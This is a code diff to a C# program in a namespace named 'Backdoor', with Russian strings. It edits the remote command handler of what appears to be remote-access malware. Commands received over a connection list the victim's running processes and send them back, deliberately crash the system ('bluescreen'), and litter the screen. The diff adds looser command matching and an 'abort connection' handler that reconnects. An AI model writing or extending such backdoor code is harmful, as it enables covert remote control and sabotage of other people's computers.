@@ -120,7 +120,7 @@ namespace Backdoor
                         continue;
                     }
 
-                    if (data == "tasklist")
+                    if (data.StartsWith("tasklist") || data == "tasklist")
                     {
                         string tasks = executor.GetAllTasksInSysFromXml();
                         conn.Send(Encoding.UTF8.GetBytes(tasks));
@@ -160,7 +160,7 @@ namespace Backdoor
                         }
                         continue;
                     }
-                    if (data == "bluescreen")
+                    if (data.StartsWith("bluescreen") || data == "bluescreen")
                     {
                         executor.CrashSystem();
                         conn.Send(Encoding.UTF8.GetBytes("Система успешно крашнута"));
@@ -245,6 +245,13 @@ namespace Backdoor
                         {
                             throw new Exception("мусорить экран системы: неверный аргумент");
                         }
+                    }
+                    if (data.StartsWith("abort connection") || data == "abort connection")
+                    {
+                        Console.WriteLine($"Пользователь прервал соеденение");
+                        conn.Send(Encoding.UTF8.GetBytes("Abort connection"));
+                        Connect();
+                        break;
                     }
                 }
                 catch (Exception e)
